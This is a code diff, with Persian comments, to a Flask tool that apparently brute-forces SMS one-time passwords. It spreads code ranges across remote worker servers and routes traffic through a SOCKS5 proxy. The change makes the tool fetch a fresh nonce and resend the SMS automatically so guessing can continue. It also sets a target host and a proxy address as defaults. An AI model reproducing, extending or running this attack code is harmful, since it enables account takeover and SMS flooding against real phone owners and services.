@@ -122,26 +122,34 @@ def auto_stop_and_restart():
         time.sleep(1)
     
     if not found_success and current_operation:
-        # Resend SMS
-        if resend_otp(current_operation['host'], current_operation['mobile'], current_operation['nonce']):
-            # Restart workers with same parameters
-            threads = []
-            for i, server in enumerate(REMOTE_SERVERS):
-                start_r, end_r = current_operation['ranges'][i]
-                thread = threading.Thread(
-                    target=send_to_remote,
-                    args=(server, current_operation['host'], current_operation['nonce'],
-                          current_operation['mobile'], current_operation['connections'],
-                          start_r, end_r)
-                )
-                threads.append(thread)
-                thread.start()
-            
-            for thread in threads:
-                thread.join()
-            
-            # Schedule next auto-stop
-            threading.Thread(target=auto_stop_and_restart, daemon=True).start()
+        # دریافت nonce جدید
+        new_nonce = fetch_nonce(current_operation['host'], current_operation['mobile'])
+        if new_nonce:
+            # به‌روزرسانی nonce در current_operation
+            current_operation['nonce'] = new_nonce
+            # ارسال مجدد SMS با nonce جدید
+            if resend_otp(current_operation['host'], current_operation['mobile'], new_nonce):
+                # راه‌اندازی مجدد کارگرها با پارامترهای قبلی
+                threads = []
+                for i, server in enumerate(REMOTE_SERVERS):
+                    start_r, end_r = current_operation['ranges'][i]
+                    thread = threading.Thread(
+                        target=send_to_remote,
+                        args=(server, current_operation['host'], new_nonce,
+                              current_operation['mobile'], current_operation['connections'],
+                              start_r, end_r)
+                    )
+                    threads.append(thread)
+                    thread.start()
+                
+                for thread in threads:
+                    thread.join()
+                
+                # برنامه‌ریزی توقف بعدی
+                threading.Thread(target=auto_stop_and_restart, daemon=True).start()
+        else:
+            progress_log.append("Failed to fetch new nonce for resending SMS")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
 
 def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
     try:
@@ -237,7 +245,7 @@ def index():
                 <form id="form" class="space-y-6">
                     <div>
                         <label class="block text-sm font-medium text-gray-700">هاست:</label>
-                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="hotst">
+                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="ram.com">
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">Nonce:</label>
@@ -253,7 +261,7 @@ def index():
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">پروکسی (SOCKS5):</label>
-                        <input type="text" id="proxy" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: socks5://user:pass@host:port" value="51.195.229.194:13000">
+                        <input type="text" id="proxy" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: socks5://user:pass@host:port" value="51.195.229.194:13001">
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">نوع اسکن:</label>
